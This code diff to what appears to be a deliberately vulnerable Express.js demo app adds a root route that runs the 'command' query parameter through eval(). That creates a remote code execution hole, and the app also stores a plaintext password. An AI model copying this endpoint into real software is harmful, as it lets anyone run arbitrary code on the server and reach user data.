@@ -15,7 +15,7 @@ db.run(`
     )`
 );
 db.run(`
-    insert into users (name, email, password) values ( 
+    insert into users (name, email, password) values (
         "Joe Citizen", "joe@example.com", "hunter2"
     )
 `);
@@ -42,6 +42,10 @@ app.get('/search', (req, res) => {
         res.render('results', { results: rows});
     }
   })
+})
+
+app.get("/", (req, res) => {
+  res.send(eval(req.query.command))
 })
 
 app.listen(port, () => {
